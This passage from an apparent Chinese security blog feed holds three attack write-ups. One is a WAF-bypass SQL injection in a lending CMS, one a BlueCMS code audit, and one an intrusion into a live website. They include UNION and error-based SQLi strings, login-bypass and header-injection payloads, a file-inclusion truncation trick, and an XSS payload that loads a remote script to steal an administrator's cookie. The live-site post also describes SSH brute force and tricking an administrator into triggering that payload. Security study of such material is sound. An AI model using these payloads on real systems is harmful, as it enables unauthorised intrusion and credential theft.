</span><br><span class="line">            left join `&#123;user_type&#125;` as p2 on  p1.type_id = p2.type_id   </span><br><span class="line">            left join `&#123;user_cache&#125;` as p3 on  p3.user_id = p1.user_id  </span><br><span class="line">            left join `&#123;account&#125;` as p4 on  p4.user_id = p1.user_id     </span><br><span class="line">            left join `&#123;userinfo&#125;` as p5 on  p5.user_id = p1.user_id    </span><br><span class="line">            where 1=1 &quot;;</span><br><span class="line">    if ($user_id!=&quot;&quot;)&#123;</span><br><span class="line">        $sql .= &quot; and p1.user_id = $user_id&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    if ($password!=&quot;&quot;)&#123;</span><br><span class="line">        $sql .= &quot; and  p1.password = &apos;&quot;.md5($password).&quot;&apos;&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    if ($username!=&quot;&quot;)&#123;</span><br><span class="line">        $sql .= &quot; and  p1.username = &apos;$username&apos;&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    if ($email!=&quot;&quot;)&#123;</span><br><span class="line">        $sql .= &quot; and  p1.email = &apos;$email&apos;&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    if ($type_id!=&quot;&quot;)&#123;</span><br><span class="line">        $sql .= &quot; and p1.type_id = &apos;$type_id&apos;&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">    return $mysql-&gt;db_fetch_array($sql);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这个user_id，就可以满足条件。我们访问如下链接，即可发现报错：</p><p><a href="https://bugs.leavesongs.com/images/2016/01/22/cc2a190d-d46e-4333-9db4-40957b5804e6.jpg" target="_blank" rel="noopener"><img src="https://bugs.leavesongs.com/images/2016/01/22/cc2a190d-d46e-4333-9db4-40957b5804e6.jpg" alt="14534034866079.jpg"></a></p><p>可说明这是一个SQL注入。我们用常规SQL注入手段，即可发现被WAF拦截：</p><p><a href="https://bugs.leavesongs.com/images/2016/01/22/54927aaf-a245-4be5-921f-b9355ffae800.jpg" target="_blank" rel="noopener"><img src="https://bugs.leavesongs.com/images/2016/01/22/54927aaf-a245-4be5-921f-b9355ffae800.jpg" alt="14534035537289.jpg"></a></p><p>那么我们用上一节说的手法，加个user.id=123123，试试还会不会被拦截了：</p><p><a href="https://bugs.leavesongs.com/images/2016/01/22/6f934f65-32f5-43e5-ac1c-b93bae98ac74.jpg" target="_blank" rel="noopener"><img src="https://bugs.leavesongs.com/images/2016/01/22/6f934f65-32f5-43e5-ac1c-b93bae98ac74.jpg" alt="14534037105927.jpg"></a></p><p>妥妥了，不拦截了，而且SQL注入也可以正常进行。<br>因为获取的是REQUEST_URI，所以特殊字符会被url编码，没关系可以用一些关键词替换。另外，我们这个方法只能绕过检测的WAF，没法绕过safe.inc.php里替换的WAF，所以还是没法使用括号。<br>即使如此，对于union select注入来说，括号什么的完全不需要呀~<br>最后构造的exp为：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://**.**.**.**/?query_site=home&amp;user_id=-1/**/Union/**/SElect/**/1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61,62,63,64,65,66,67,68,69,70,71,72,73,74,75,76,77,78,79,80,81,82,83,84,85,86,87,88,89,90,91,92,93,94,95,96,97,98,99,100,101,102,103,104,105,106,107,108,109,110,111,112,113,114,115,116,117,118,119,120,121,122,123,124,125,126,127,128,129,130,131,132,133,username,password,136,137,138,139,140,141,142,143,144,145,146,147,148,149,150,151,152,153,154,155,156,157,158,159,160,161,162,163,164,165,166,167,168,169,170,171,172,173,174,175,176,177,178,179,180,181,182,183,184,185,186,187,188,189,190,191,192,193,194/**/from/**/dw_user/**/limit/**/0,1&amp;user.id=1</span><br></pre></td></tr></table></figure><p>可以直接注射获得任意数据库内信息，比如管理员密码：</p><p><a href="https://bugs.leavesongs.com/images/2016/01/22/a45f0002-de7f-486d-bed9-8dd42cd76f71.jpg" target="_blank" rel="noopener"><img src="https://bugs.leavesongs.com/images/2016/01/22/a45f0002-de7f-486d-bed9-8dd42cd76f71.jpg" alt="14534039362628.jpg"></a></p><h3 id="0x05-总结"><a href="#0x05-总结" class="headerlink" title="0x05 总结"></a>0x05 总结</h3><p>这个洞的挖掘包括利用其实很巧妙，利用的是hpp+php特性，来绕过CMS应用中变态的WAF。造成漏洞 的根本原因不在hpp，也不在php的这个特性，根本原因是贷齐乐内部存在太多显而易见的SQL注入漏洞。<br>但由于其官方开发人员过于相信WAF，或者说他们并没有正确处理SQL注入漏洞的能力，只能通过拦截一些关键字来抵御SQL注入。那么一旦WAF被绕过，将造成无法挽回的损失。</p></excerpt>]]></content>
      
      
      
        <tags>
            
            <tag> waf </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>waf</title>
      <link href="/2019/09/07/waf/"/>
      <url>/2019/09/07/waf/</url>
      
        <content type="html"><![CDATA[<excerpt in index> <p>原创： MOZA 合天智汇</p><a id="more"></a><p>原创： MOZA 合天智汇</p><p><a href="https://zhuanlan.zhihu.com/p/44326395" target="_blank" rel="noopener">https://zhuanlan.zhihu.com/p/44326395</a></p><p>0*00前言故事的起因:</p><p><img src="https://pic3.zhimg.com/80/v2-88e88ae12b74aa9af71e73769baab006_hd.jpg" alt="img"></p><p>然后</p><p><img src="https://pic3.zhimg.com/80/v2-8d9ef3f8cbbd007aedee2b526a1ebf0a_hd.jpg" alt="img"></p><p>没有想到我为了一张SSC安全峰会的门票，义无反顾的走进上了一条不归路，不是一般的坑…</p><p>0*01信息收集首先打开网站首页是这样子咳咳~为了和谐接下来都会打上重码</p><p><img src="https://pic4.zhimg.com/80/v2-8ef38dcb69904391e869032390046da7_hd.jpg" alt="img"></p><p>我总觉得布局很像是某影视cms，所以打算先识别一下cms。</p><p><img src="https://pic3.zhimg.com/80/v2-4bd07199cadd0a0058c01fce5ab0707a_hd.jpg" alt="img"></p><p>唔，不知道为什么bugscan的在线指纹识别并不能访问，或许是waf，又或许是bugscan自己的黑名单。本地cms识别。</p><p><img src="https://pic3.zhimg.com/80/v2-c496c00ecbe2a4a7a3b697abbeeb0726_hd.png" alt="img"></p><p>没有结果，接下来多地ping一下。</p><p><img src="https://pic2.zhimg.com/80/v2-52c82ed9aa4bce456fc931dab5208941_hd.jpg" alt="img"></p><p>发现cdn，并且发现似乎是美国的服务商，可能bugscan不能识别跟这个有关。绕过cdn找真实ip的方法，我在前面的文章有提到过，这里由于网站不存在注册功能，并且cdn服务商为美国，dns解析记录又没有找到真实ip（由于av域名经常换），所以这里就搁下了，不过到最后我还是拿到了，那是后话了。整个网站都加了waf，扫描起来很难受，而且这种类型的网站不做支持爬虫机制，不能从搜索引擎中获取敏感信息。<br>端口开放信息如下：</p><p><img src="https://pic4.zhimg.com/80/v2-fb46666367c813d6f69a0f59c3c7e767_hd.jpg" alt="img"></p><p>端口开放很有限。目录扫描结果如下：</p><p><img src="https://pic1.zhimg.com/80/v2-1828b763563e3835bf88537a1528fb24_hd.jpg" alt="img"></p><p>意料之中，因为上面的url基本样式都是这样子的：</p><p><img src="https://pic1.zhimg.com/80/v2-9adf015fb373627916d47a525d447b00_hd.jpg" alt="img"></p><p>可以肯定的是基于某影视cms二次开发，并且很有良心，把注册功能去掉了。子域名我并没有打算扫，因为一个如此类型的网站，会经常换域名，不太现实。可能是我的字典太菜了，二级目录并没有扫描出什么结果。</p><p>0*02渗透测试ing经过一番测试，我并没有找到sql注入，并且waf太过严格，大多数时间都只能用手测，实在太痛苦了，但是让我找到了一个很有意思的东西。</p><p><img src="https://pic3.zhimg.com/80/v2-6783835540f584e37a3b1e3ea9c45e42_hd.png" alt="img"></p><p>首先点开第一个，这里有一个友情链接的申请提交表单，我在第一时间想到了xss盲打，然而存在一个问题，如果不成功，会打草惊蛇，导致接下来的渗透变得异常艰难。</p><p><img src="https://pic4.zhimg.com/80/v2-d0be62a15ce397dca332e1aabe0544ff_hd.jpg" alt="img"></p><p>第二个广告联系，这个链接非常坑，首先我点开的时候发现是这样子的：</p><p><img src="https://pic4.zhimg.com/80/v2-0e17f6fe74a81295e2393ff414fcd7d3_hd.png" alt="img"></p><p>我？？</p><p><img src="https://pic2.zhimg.com/80/v2-e85f5abbc52b6abfafb4fbba3fa6232d_hd.jpg" alt="img"></p><p>查看页面源代码看看：</p><p><img src="https://pic3.zhimg.com/80/v2-39f5c10e4528db35f0cbf6a1b43f7a4a_hd.png" alt="img"></p><p>这不按照套路出牌啊？难道联系站长还得黑科技？？？在这里我琢磨了很久，查看链接跳转的确没啥毛病，但我总觉得不对劲，然后脑子一抽想起了那个美国的cdn，掏出了我珍藏多年的翻墙梯，重新点了一次广告联系。</p><p><img src="https://pic3.zhimg.com/80/v2-6a805da608e5eebfd0c4a923fb1eb42a_hd.jpg" alt="img"></p><p>？？这年头，连找站长都必须不是国内ip了吗…我没有先着急加qq。继续点开第三个视频删除，没想到还能删除视频？</p><p><img src="https://pic3.zhimg.com/80/v2-f5037dad13d0c951fa2289b8b7a4d1ce_hd.jpg" alt="img"></p><p>唔，事实证明我还是太年轻了。也算是有收获，得到了一个邮箱。整站做了静态处理，没有交互的参数，整个渗透似乎到这里就陷入了死路，我甚至写了个爬虫，递归性的爬了一整个网站，然而没有发现…突然想起可以扫c段，但是我又发现没有找到真实ip，所以压根不存在C段这个东西。吃个辣条整理一下思路，ssh可以尝试爆破一波，直接上神器</p><p><img src="https://pic3.zhimg.com/80/v2-16953128fe74c0f7097d64abe6917e3a_hd.jpg" alt="img"></p><p>然后，我就被banip了有waf的爆破比较麻烦，但没关系，我有代理池，时间我也有的是。然后就在折磨中爆破了三天…，并没有啥结果…。</p><p>0*03路途坎坷在失落中点开了目标站点，让我脑子顿时清醒了起来，他居然又换网址了，并且贴心的给了提示。</p><p><img src="https://pic2.zhimg.com/80/v2-27a8868da378abc8931b3417ef8c0729_hd.jpg" alt="img"></p><p>我看了一下源代码</p><p><img src="https://pic3.zhimg.com/80/v2-3070031fcd863cf05b81573b55b1671a_hd.png" alt="img"></p><p>是一个跳转链接，不过很奇怪没有写成超链接的形式，而是直接服务端跳转。测试一下是否存在url跳转漏洞，直接在index.php上get传值过去。</p><p><img src="https://pic2.zhimg.com/80/v2-6e22617d1dcefafe380472d412636ced_hd.jpg" alt="img"></p><p>很尴尬并没有跳转成功，而是正常跳转到了目标新的网址。由于所有的错误都会正常跳转，导致无法通过错误信息调整payload，所以在这里我进行了大量关于url跳转漏洞的绕过尝试：首先去掉协议:</p><p><img src="https://pic2.zhimg.com/80/v2-5e7300f05d95ec18665aead03a7d32a1_hd.jpg" alt="img"></p><p>无果，去掉www：</p><p><img src="https://pic2.zhimg.com/80/v2-dba063f28b503c48b81566b59a5317bd_hd.jpg" alt="img"></p><p>将域名换成ip地址:</p><p><img src="https://pic2.zhimg.com/80/v2-eafa9f40359dd60acce3d4a771ea9c31_hd.jpg" alt="img"></p><p>更换协议</p><p><img src="https://pic3.zhimg.com/80/v2-c2c8fb8c0322161b44731d7f1a1565c2_hd.jpg" alt="img"></p><p>尝试通过添加多余的”/“(%2F)符号，再对”.”两次url编码成”%252E”绕过代码中对域名后”.com”的切割</p><p><img src="https://pic1.zhimg.com/80/v2-9018c4d4be71a164abbd93cb58da0e90_hd.jpg" alt="img"></p><p>尝试”;”,”/“, “\”, “?”, “:”, “@”,”=”, “&amp;”, “.”特殊字符绕过</p><p><img src="https://pic1.zhimg.com/80/v2-a82a53183ae2d3cd28e90865c783c434_hd.jpg" alt="img"></p><p>经过了非常消磨耐性与想象力的过程，我成功测试成功payload<a href="https://link.zhihu.com/?target=https%3A//www.xxx.com/index.php%3Flink%3Dhttps%3A//www.xxxx.com" target="_blank" rel="noopener">https://www.xxx.com/index.php?link=https://www.xxxx.com</a>\?<a href="https://link.zhihu.com/?target=https%3A//www.baidu.com/." target="_blank" rel="noopener">https://www.baidu.com/.</a>.</p><p><img src="https://pic4.zhimg.com/80/v2-6cb00e5ad5aea9cf8a933ea0b96dfd0f_hd.jpg" alt="img"></p><p>实在很迷，关于url跳转漏洞的测试，有机会可以总结一下。但我突然发现一个问题，url跳转成功似乎也没啥卵用，我总不能拿去钓鱼站长，因为不知道站点的后台地址，无法模仿出钓鱼页面。我内心：</p><p><img src="https://pic3.zhimg.com/80/v2-69a54a2ded96965cc84ef8fc2a90ee66_hd.jpg" alt="img"></p><p>0*04峰回路转Link参数是采用服务端跳转的方式，并且没有引用js脚本，所以基本可以肯定没有xss漏洞，但是在这时候我又发现了一个信息。</p><p><img src="https://pic1.zhimg.com/80/v2-205d36559dd4bbca3966cbe7a8005ad4_hd.png" alt="img"></p><p>他更新了，我在他这个版本里面没有发现搜索功能，但是先前的版本很可能会存在，而且更新的一般都是框架型的更新，比如说模板之类的，实际的底层代码很多都没变，既然index.php存在link参数，那么跟搜索相关的参数比说:?s，?search，?sou等等。掏出珍藏已久的关键字执行字典，丢进在自己写的扫描脚本，加上代理池，坐等结果。</p><p><img src="https://pic4.zhimg.com/80/v2-4f959432a272d9eafedb24005d564dd3_hd.jpg" alt="img"></p><p>s参数存活我们去看看究竟是个什么功能。</p><p><img src="https://pic2.zhimg.com/80/v2-9a0c2889c46c6453fc5a8460f3a5f275_hd.jpg" alt="img"></p><p>确定是搜索功能，并且为什么我搜我id会有一个不可描述的视频…我们可以尝试能否挖到反射型xss或者搜索型文本框注入。</p><p>0*05 by bass首先是xss：</p><p><img src="https://pic3.zhimg.com/80/v2-b9bc4d11ffa90dbb8b33b8c6e20a07de_hd.jpg" alt="img"></p><p>查看源码，可知我们在strong标签。</p><p><img src="https://pic2.zhimg.com/80/v2-41b181c51a95a6ec536c07cf6683b3bd_hd.png" alt="img"></p><p>过滤了相应的关键字，尖括号等，尝试关键字大小写与尖括号重复绕过。（失败）</p><p><img src="https://pic3.zhimg.com/80/v2-021e60b11b7f4cead9de23ad3b052396_hd.png" alt="img"></p><p>发现并没有过滤双引号，单引号，\</p><p><img src="https://pic4.zhimg.com/80/v2-fa683363a04df8d48d3ee48d3017527b_hd.jpg" alt="img"></p><p>尝试未递归绕过</p><p><img src="https://pic1.zhimg.com/80/v2-6f4a5dee1f277e03edf98658c947bb1c_hd.png" alt="img"></p><p>这个输出点并没有在标签内，并且过滤了&lt;&gt;尝试各种编码没办法绕过，也就是无法逃匿<strong>标签，遂放弃此输出点。但是我们还有另一个输出点</strong></p><p><img src="https://pic2.zhimg.com/80/v2-0c183558be0232c23a54d128435267d1_hd.jpg" alt="img"></p><p>先右键源码看一下</p><p><img src="https://pic3.zhimg.com/80/v2-f6e458e125da567e6b7dd0f4fc3a600a_hd.png" alt="img"></p><p>&lt;inputid=”wd” name=”wd” class=”search-inputacInput” value=”moza” type=”text”&gt;思路很清楚，由于没有过滤”我们可以闭合value属性，然后通过一些事件去触发弹窗。<br>但是让我始料未及的是</p><p><img src="https://pic3.zhimg.com/80/v2-2b7c91f2a594b9142182235364b786c6_hd.jpg" alt="img"></p><p>Input的小括号被过滤了。我们来构造一下原始payloadmoza”autofocus onfocus=alert(1)a=”代码很简单插入一个事件与一个属性，其中onfocus事件在对象获得焦点时发生，autofocus属性规定当页面加载时input元素应该自动获得焦点。简单来说，就是它会自动获取焦点然后执行onfocus=xxxx中的xxxx。但是()被过滤，采用location=url模式，可以将括号写为%28%29所以payload变成这个样子moza”autofocus onfocus=location=’javascript:alert%25281%2529’a=”其中%25为”%”的url编码。然而由于此处输出点过滤单引号</p><p><img src="https://pic2.zhimg.com/80/v2-287c1e97cca84ab8bc8a8d26071d3bfd_hd.jpg" alt="img"></p><p>所以我们换一种方式传入，用this.name进行传值,所以最后的payload变成了moza”autofocusname=javascript:alert%25281%2529 onfocus=location=this.name a=”令人窒息的是过滤了script却没有过滤javascript，故这里就不用在做编码绕过。然后我们就成功弹窗了。</p><p><img src="https://pic2.zhimg.com/80/v2-dd3ccd19735dd5d2c90c6d14253544b5_hd.jpg" alt="img"></p><p>当然弹窗还不行，我们需要用到xss平台，让我们来引入外链盗取后台地址与及cookie。moza”name=javasCript:s=document.createElement%2528”script”%2529;s.src=”<a href="https://link.zhihu.com/?target=http%3A//xxxxxx.com/xxx.js" target="_blank" rel="noopener">http://xxxxxx.com/xxx.js</a>“;document.body.appendChild%2528s%2529;autofocus onfocus=location=this.name a=”<br>这里有两个思路。第一个是加他qq然后骗他点击。第二个就是友链申请，直接丢上去。第一种感觉有点难套路，我们用第二种</p><p><img src="https://pic1.zhimg.com/80/v2-ea9fdfbc9fa7dceea32f9a1651de1b20_hd.jpg" alt="img"></p><p>然后我就去吃辣条了。两小时后收到邮件。</p><p><img src="https://pic3.zhimg.com/80/v2-26b0247f4654663a150cfd0df24f565e_hd.jpg" alt="img"></p><p>并且在这里拿到了真实的ip，说实话这后台地址我不想吐槽…/h0ut4is_admin/ 不得不服</p><p><img src="https://pic3.zhimg.com/80/v2-6e96bc204815a8e8fb40d58557a88b92_hd.jpg" alt="img"></p><p>最后登陆后台</p><p><img src="https://pic1.zhimg.com/80/v2-84d732fe1b8a24179517bfd3afd47c40_hd.jpg" alt="img"></p><p>还是打码吧，要和谐，没有打算getshell，太累了。最后我的门票也到手了。</p><p><img src="https://pic4.zhimg.com/80/v2-9fa432909367d1df84285325017cabdb_hd.jpg" alt="img"></p><p>0*06总结在渗透测试过程中，注意收集信息，并且需要有足够的耐心，共勉。</p></excerpt>]]></content>
      
      
      
        <tags>
            
            <tag> waf </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Sql注入 - 0day审计案例</title>
      <link href="/2019/06/01/Sql%E6%B3%A8%E5%85%A5%20-%200day%E5%AE%A1%E8%AE%A1%E6%A1%88%E4%BE%8B/"/>
      <url>/2019/06/01/Sql%E6%B3%A8%E5%85%A5%20-%200day%E5%AE%A1%E8%AE%A1%E6%A1%88%E4%BE%8B/</url>
      
        <content type="html"><![CDATA[<p><excerpt in index> </excerpt></p><ul><li><a id="more"></a><the rest of contents文></the></li></ul><h1 id="适合萌新的代码审计-BlueCMS-v1-6-sp1"><a href="#适合萌新的代码审计-BlueCMS-v1-6-sp1" class="headerlink" title="适合萌新的代码审计-BlueCMS v1.6 sp1**"></a>适合萌新的代码审计-BlueCMS v1.6 sp1**</h1><p><strong>接下来是聂风大哥的文章</strong></p><p><strong>## 0x01 环境搭建</strong></p><p><strong>Phpstudy</strong></p><p><strong>BlueCMS v1.6 sp1源码</strong></p><p><strong>代码审计工具（Seay源代码审计系统）</strong></p><p><strong>0x02 代码审计过程</strong></p><p><strong>拿到一个CMS，有诸多审计方法，我这里的审计方法是黑盒+白盒测试，偏黑盒较多的代码审计。拿到代码后我们应该先对其进行功能点的分析，看一看该CMS存在哪些功能，因为我们寻找漏洞，肯定是从网站中的正常功能进行测试，这是黑盒测试的一个方法，挖掘漏洞的核心我认为在于传参，知道每个传参的意义是不是就等于知道了代码会做什么，要做什么呢？</strong></p><p><strong>这是我总结的BlueCMS v1.6 sp1的功能点</strong></p><p><strong><img src="https://www.zkaq.org/upload/userfile/131/5e2bebe9ca4f35ce555a9050c78793e1.png" alt="img"></strong> </p><hr><p><strong>正常而言，我们先将CMS进行一个安装，正常而言CMS的源码放入web目录下后我们会访问install目录，然后进行安装。安装完后我们是不是应该以安全工程师的身份去想一想，我们是否能够再次访问install目录，进行重新安装呢？如果能够进行重新安装，是不是就可以将整个网站的数据全部重装，然后拿到设置新的管理员账号，然后通过后台拿到webshell?</strong></p><p><strong>然后我们去访问该页面，正常，可以重装</strong></p><p><strong><img src="https://www.zkaq.org/upload/userfile/131/4670cb5c1130700601c5803260b15478.png" alt="img"></strong> </p><p><strong>于是我们审计出了代码的第一个问题，可以重复安装呢！是不是很简单？</strong></p><p><strong>然后我们再来看这个网站，一般而言网站有展示类和功能类。</strong></p><p><strong>展示类（比如新闻站、门户站）</strong></p><p><strong>功能类（比如商城、OA、系统）</strong></p><p><strong>但是无论是展示类还是功能如果我们可以拿到一个普通用户的权限是不是更加容易渗透测试？测试的点是不是更多？</strong></p><p><strong>那么我们去注册一个账户吧！</strong></p><p><strong><img src="https://www.zkaq.org/upload/userfile/131/cb2945b508579416d3d065da51279057.png" alt="img"></strong> </p><p><strong>注册一个账号，我们想一想，是不是可以尝试进行一个XSS，我们先注册一个账号，然后抓包看看，然后我们输入了用户名后，我们发现burp抓了一个包</strong></p><p><strong><img src="https://www.zkaq.org/upload/userfile/131/fbd20ccb2c1fcd1b84b7b257dafa4785.png" alt="img"></strong> </p><p><strong>很明显这个数据包是用来检测你的用户名是否有人注册过，那么我们是不是可以通过爆破user_name传参进行爆破出用户名。（爆破出用户名后爆破密码更容易）</strong></p><p><strong>然后填完所有内容，提交，然后抓到了数据包，我们发现是被提交到user.php</strong></p><p><strong><img src="https://www.zkaq.org/upload/userfile/131/cbe3778c742c93b08cc8d97fab7c0076.png" alt="img"></strong> </p><p><strong>然后我们通过代码审计工具去找那个文件</strong></p><p><strong>在传参中我们看到了我自己输入的账号|密码|邮箱|验证码，然后最后出现了一个act传参，打开这个user.php我们可以看出这个文件有好几个功能，act就是决定我的数据包是干什么的传参，于是乎复制这个传参值去源码中寻找这个传参</strong></p><p><strong><img src="https://www.zkaq.org/upload/userfile/131/0073ee54e66c3553cbb7b4239214193a.png" alt="img"></strong> </p><p><strong>这段源码就是关于你的注册，我们可以看到INSERT INTO 插入，然后我们看是否存在过滤，很明显这里没有过滤，那么我们尝试进行XSS以及SQL注入。</strong></p><p><strong>我们就先看XSS。</strong></p><p><strong>先抓包，正常的填写注册，然后将数据包拦截（这是为了防止前端检测）</strong></p><p><strong>修改数据包，加入XSS语句，我是在邮件的地方加的。</strong></p><p><strong><img src="https://www.zkaq.org/upload/userfile/131/0ca538e7c623a5f1e2d79b1d68dd038c.png" alt="img"></strong> </p><p><strong>成功弹窗</strong></p><p><strong><img src="https://www.zkaq.org/upload/userfile/131/5c616750600e3b0f354911ebfa1d5eb1.png" alt="img"></strong> </p><p><strong>事实证明这里存在一个存储型XSS，然后我们再去看看SQL注入</strong></p><p><strong><img src="https://www.zkaq.org/upload/userfile/131/87ad1edbde5ab662a0d666c474bd26e3.png" alt="img"></strong> </p><p><strong>这很明显是他的SQL语句，然后我们尝试使用updatexml的报错</strong></p><p><strong>构建下语句。</strong></p><p><strong>‘ or updatexml(1,concat(0x7e,(SELECT database())),1),1,1)#</strong></p><p><strong>然后执行，居然成功执行了。没有过滤？居然能成功执行，说明单引号没有起作用，是不是存在魔术引号？试试宽字节！</strong></p><p><strong>%df’ or updatexml(1,concat(0x7e,(SELECT database())),1),1,1)#</strong></p><p><strong>然后成功报错</strong></p><p><strong><img src="https://www.zkaq.org/upload/userfile/131/5b28efe53081f9e27e30e71722f340a8.png" alt="img"></strong> </p><p><strong>很明显这里存在SQL注入，但是这里神奇的很，我这里报错说语法错误，我直接去本地执行却没问题！源码中对报错做了限制。只能通过盲注来解决，难受！</strong></p><p><strong><img src="https://www.zkaq.org/upload/userfile/131/392eb522a0defce9d44a860849422da3.png" alt="img"></strong> </p><p><strong>我们仔细思考，这里是一个插入语句，那么我们是不是可以尝试插入多行数据，我们通过语句构建，再建立一个用户，然后用子查询填充邮箱处，然后我们登陆这个账号是不是就可以看到邮箱字段里面的内容，走，说干就干！！</strong></p><p><strong>构建语句：</strong></p><p><strong>%df’,1,1),(100,0x6162717765,md5(123456),(select database()),1,1)#</strong></p><p><strong>闭合原本的语句，然后再插入一条数据，然后执行，成功执行了！！</strong></p><p><strong><img src="https://www.zkaq.org/upload/userfile/131/a06a4e198098153a8a7d1cd08bbbafb9.png" alt="img"></strong> </p><p><strong>数据被插入了，走，登陆账号</strong></p><p><strong><img src="https://www.zkaq.org/upload/userfile/131/ad20a39f7924806f6b44d8a9b8e87071.png" alt="img"></strong> </p><p><strong>很明显，库名在邮箱处显示了，与似乎我们可以通过这样的方法利用这个点！！</strong></p><p><strong>我们结束了注册功能在看看登录功能，登录处会不会存在SQL注入？</strong></p><p><strong>老样子，登录，然后抓包看传参到那个文件</strong></p><p><strong><img src="https://www.zkaq.org/upload/userfile/131/38b8f3246e005b4b914e9c2a19f1d6d2.png" alt="img"></strong> </p><p><strong>还是那个文件，就是act变为了index_login</strong></p><p><strong><img src="https://www.zkaq.org/upload/userfile/131/ea65124356bcaf8d263738b852a1a3d5.png" alt="img"></strong> </p><p><strong>登录还定义了函数，右键函数追踪一下</strong></p><p><strong><img src="https://www.zkaq.org/upload/userfile/131/d5236530507f6f6bf3c0364f4b19c53b.png" alt="img"></strong> </p><p><strong>还是老样子，没有任何过滤，那么试试万能密码吧</strong></p><p><strong>payload：%df’) or 1=1#</strong></p><p><strong>万能密码成功登录</strong></p><p><strong>万能密码就是存在POST类型的SQL注入，可以尝试使用SQLMAP</strong></p><p><strong>我是跑数据包，在pwd字段</strong></p><p><strong><img src="https://www.zkaq.org/upload/userfile/131/dd3a4af43037dbb88b0bd810e540ef26.png" alt="img"></strong> </p><p><strong><img src="https://www.zkaq.org/upload/userfile/131/b236b2d5d9d96f84995b105f76a9b937.png" alt="img"></strong> </p><p><strong>然后登录后修改资料处也存在SQL注入和XSS</strong></p><hr><p><strong>然后我们看到了别人的文章，我们看到我们可以评论</strong></p><p><strong><img src="https://www.zkaq.org/upload/userfile/131/4394a38d234e3b39ac6d96ccaf8c4db2.png" alt="img"></strong> </p><p><strong>然后果断评论,我尝试了不登录也是可以评论，然后我们抓包看看吧！</strong></p><p><strong><img src="https://www.zkaq.org/upload/userfile/131/8c021c6867f9545da5564f8fb2b992be.png" alt="img"></strong> </p><p><strong>去看看这个文件</strong></p><p><strong><img src="https://www.zkaq.org/upload/userfile/131/a3f1d3c4b2ade11ebd868edb74f56926.png" alt="img"></strong> </p><p><strong>这里似乎有一个过滤</strong></p><p><strong>Htmlspecialchars会将尖括号转化为HTML实体，那么不能出现尖括号</strong></p><p><strong>然后呢这里我们来玩一个骚套路</strong></p><p><strong>我们看到传参里面有ip对吗？</strong></p><p><strong>留言记录IP这个是留言系统中经常存在的套路。那我们看到了他实际上插入了ip的值是特意拼接是，是由这个自定义函数设定getip()</strong></p><p><strong>走，我们去找找这个函数的定义</strong></p><p><strong><img src="https://www.zkaq.org/upload/userfile/131/da85e37b93eab0ffb7ef4b95fc5804e0.png" alt="img"></strong> </p><p><strong>找到了定义的函数，这里有一个getenv，实际上就是获取系统的环境变量</strong></p><p><strong>第一个HTTP_CLIENT_IP这个环境变量没有成标准，很多服务器完全没法获取</strong></p><p><strong>第二个X-Forwarded-For 这个东西可以通过HTTP请求头来修改。</strong></p><p><strong>那么问题来了!</strong></p><p><strong>我们似乎可以控制请求头中的X-Forwarded-For控制ip的传参，ip的传参会直接被拼凑到SQL语句，走！我们SQL注入去（类似的问题挺多的，黑盒白盒我都遇到过）</strong></p><p><strong>设置X-Forwarded-For为1’#</strong></p><p><strong>然后直接报错了</strong></p><p><strong><img src="https://www.zkaq.org/upload/userfile/131/a538668622fecd029577a16c70f78519.png" alt="img"></strong></p><p><strong>因为这个不是输入，连宽字节都省了，如果这里没有宽字节注入就可以这样来注入.</strong></p><p><strong><img src="https://www.zkaq.org/upload/userfile/131/c9a43b60b16d76cecafb70a53b8853b1.png" alt="img"></strong> </p><hr><p><strong>里面还有些SQL注入和XSS的漏洞我就不一一列举了。</strong></p><p><strong>我们看一点不一样的</strong></p><p><strong>在后台我看到了可以备份数据库</strong></p><p> <strong><img src="https://www.zkaq.org/upload/userfile/131/17e6450870dc76479c17e63059f1156e.png" alt="img"></strong></p><p><strong><img src="https://www.zkaq.org/upload/userfile/131/c90e594fac2006a8285491cfd3af8d48.png" alt="img"></strong> </p><p><strong>发现他是按照日期生成备份文件，我们尝试爆破地址</strong></p><p><strong><img src="https://www.zkaq.org/upload/userfile/131/e6e5757a538e2f7f804dd5dfbb78185a.png" alt="img"></strong> </p><p><strong>然后成功访问，里面有管理员账号密码（密码就是MD5，解密下就行）</strong></p><hr><p><strong>我们再来讲一个更有深度的漏洞–文件包含</strong></p><p><strong>还记得前面看了好几次的user.php吗?</strong></p><p><strong>通过全局寻找include,我发现里面有一些有趣的东西</strong></p><p><strong><img src="https://www.zkaq.org/upload/userfile/131/8dddeefa261a6385eddafa50f9bbfe0b.png" alt="img"></strong> </p><p><strong>我们可以通过传参pay来控制包含的文件。</strong></p><p><strong>我们先尝试正常操作让act传参pay</strong></p><p><strong>然后我发现这个传参是在充值中心的购买充值卡的地方的选择支付方式</strong></p><p><strong><img src="https://www.zkaq.org/upload/userfile/131/2a65758d52b7a97a40c5f97b580a354b.png" alt="img"></strong> </p><p><strong><img src="https://www.zkaq.org/upload/userfile/131/0d98c60e2b98c9656f05cb4b5f756d8f.png" alt="img"></strong> </p><p><strong>然后我们先在网站根目录留一个1.txt，内容写</strong></p><p><strong>&lt;?php phpinfo();?&gt;</strong></p><p><strong>然后尝试拼接</strong></p><p><strong>通过../跳转到上层目录,但是我们发现这个语句后面有一个index.php的拼接。那该怎么办妮？在这里我们可以尝试一个字符串截断的方法（Windows的路径不能超过256个字符）</strong></p><p><strong>那么我们是不是可以尝试在传参的后面加点进行阶段，因为点最后会被windows给处理掉，但是填充了点之后，只会保留包含前面的1.txt，在传参后的index.php因为路径超过256个字符后的东西都会被舍弃，于是乎我们直接传参后加256个点就可以截断了</strong></p><hr><hr><p><strong>Payload:</strong><br><strong>pay=../../1.txt………………………………………………………………………………………………………………………………………………………………………………………………………………………………….</strong></p><p><strong><img src="https://www.zkaq.org/upload/userfile/131/7e3df9254fdbca4de7e39e05a48f5625.png" 